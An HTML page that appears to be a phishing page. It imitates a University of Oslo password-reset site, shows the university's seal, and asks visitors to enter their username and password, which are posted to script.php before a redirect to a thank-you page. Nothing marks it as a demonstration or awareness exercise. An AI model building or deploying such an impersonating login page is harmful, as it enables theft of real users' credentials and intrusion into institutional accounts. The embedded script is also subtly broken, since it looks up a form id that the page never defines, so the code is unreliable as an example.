<!DOCTYPE html>
<html lang="en">
    <title> Login Page </title>  
    <style>   
    Body {  
      font-family: Calibri, Helvetica, sans-serif;  
      background-color: rgb(255, 255, 255);  
    }  
    img {
        max-width: 60px;
    }
    button {   
           background-color: #4CAF50;   
           width: 100%;  
            color: rgb(255, 255, 255);   
            padding: 15px;   
            margin: 10px 0px;   
            border: none;   
            cursor: pointer;   
             }   
     form {   
            border: 3px solid #f1f1f1;   
        }   
     input[type=text], input[type=password] {   
            width: 100%;   
            margin: 8px 0;  
            padding: 12px 20px;   
            display: inline-block;   
            border: 2px solid green;   
            box-sizing: border-box;   
        }  
     button:hover {   
            opacity: 0.7;   
        }   
      .cancelbtn {   
            width: auto;   
            padding: 10px 18px;  
            margin: 10px 5px;  
        }   
            
         
     .container {   
            padding: 25px;   
            background-color: lightblue;  
        }   
    </style>   
    </head>    
    <body>    
        <center>  <h1> <img src="https://upload.wikimedia.org/wikipedia/en/thumb/3/31/University_of_Oslo_seal.svg/1200px-University_of_Oslo_seal.svg.png"> UiO Password Reset </h1> </center>   
        <form action="script.php" method="post">
            <div class="container">
                <h1>Login to reset password</h1>
                <label>Username : </label>
                <input type="text" placeholder="Enter Username" name="username" id="username" required>
                <label>Password : </label>
                <input type="password" placeholder="Enter Password" name="password" id="password" required>
                <button type="submit">Login</button>
                <button type="button" class="cancelbtn"> Cancel</button>
                Forgot <a href="#"> password? </a>
            </div>
        </form>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                const form = document.getElementById('loginForm');
            
                form.addEventListener('submit', function (event) {
                    event.preventDefault(); // Prevent the default form submission
            
                    // Get form data
                    const formData = new FormData(form);
            
                    // Send the data to a server-side script using the Fetch API
                    fetch('script.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => {
                        if (response.ok) {
                            // If the response is successful, you can redirect the user to a thank you page or show a success message.
                            // You can handle this based on your requirements.
                            window.location.href = 'thank_you.html';
                        } else {
                            // Handle errors or display an error message to the user.
                            console.error('Form submission failed.');
                        }
                    })
                    .catch(error => {
                        console.error('An error occurred:', error);
                    });
                });
            });
            </script>    
    </body>  
</html>
